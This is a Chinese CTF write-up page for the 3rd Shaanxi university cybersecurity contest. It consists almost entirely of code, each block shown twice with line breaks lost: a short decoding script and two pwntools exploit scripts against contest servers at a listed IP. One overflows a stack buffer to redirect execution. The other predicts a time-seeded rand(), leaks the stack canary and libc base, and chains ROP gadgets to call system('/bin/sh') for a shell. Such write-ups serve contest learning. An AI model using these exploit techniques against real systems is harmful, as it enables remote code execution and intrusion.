# 第三届陕西大学生网安技能大赛部分WP

> 原文: https://www.ctfiot.com/118672.html
> ID: 118672

a='8881088410842088810810842042108108821041010882108881' s=a.split('0') print(s) l=[] for i in s: sum=0 for j in i: sum+=eval(j) l.append(chr(sum+64)) print(''.join(l))

from pwn import * #p=process('nc 60.204.130.55 10005 ',shell=True) p=remote('60.204.130.55',10005) p.recvuntil('?n') p.sendline('a') p.recvuntil('?n') payload='a'*152+p64(0x00000000004005d6)+p64(0x40082d) p.sendline(payload) p.interactive()

from pwn import * import ctypes context.log_level='debug' pop_rdi=0x0000000000400b93 p=process('nc 60.204.130.55 10004 ',shell=True) p.recvuntil(':') p.sendline('1') p.recvuntil('Game Go:n') libb=ELF('/lib/x86_64-linux-gnu/libc.so.6') libc=ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6') seed=libc.time(0) libc.srand(seed) p.sendline(str(libc.rand() % 100 + 1)) p.recv(0x48) canary=u64(p.recv(8)) p.recv(8) libcbase=u64(p.recvuntil(b'x7f').ljust(8,b'x00'))-171408 print(hex(libcbase)) system=libb.sym['system']+libcbase binsh=libcbase+0x00000000001d8698 payload=b'a'*0x28+p64(canary)+p64(0x0)+p64(0x000000000040073e)+p64(pop_rdi)+p64(binsh)+p64(system) p.sendline(payload) p.interactive()


```
a='8881088410842088810810842042108108821041010882108881' s=a.split('0') print(s) l=[] for i in s: sum=0 for j in i: sum+=eval(j) l.append(chr(sum+64)) print(''.join(l))
```



```
from pwn import * #p=process('nc 60.204.130.55 10005 ',shell=True) p=remote('60.204.130.55',10005) p.recvuntil('?n') p.sendline('a') p.recvuntil('?n') payload='a'*152+p64(0x00000000004005d6)+p64(0x40082d) p.sendline(payload) p.interactive()
```



```
from pwn import * import ctypes context.log_level='debug' pop_rdi=0x0000000000400b93 p=process('nc 60.204.130.55 10004 ',shell=True) p.recvuntil(':') p.sendline('1') p.recvuntil('Game Go:n') libb=ELF('/lib/x86_64-linux-gnu/libc.so.6') libc=ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6') seed=libc.time(0) libc.srand(seed) p.sendline(str(libc.rand() % 100 + 1)) p.recv(0x48) canary=u64(p.recv(8)) p.recv(8) libcbase=u64(p.recvuntil(b'x7f').ljust(8,b'x00'))-171408 print(hex(libcbase)) system=libb.sym['system']+libcbase binsh=libcbase+0x00000000001d8698 payload=b'a'*0x28+p64(canary)+p64(0x0)+p64(0x000000000040073e)+p64(pop_rdi)+p64(binsh)+p64(system) p.sendline(payload) p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/2-1685927082.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/1-1685927082.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/0-1685927082.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/0-1685927083.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/5-1685927083.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/8-1685927083.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/10-1685927084.png)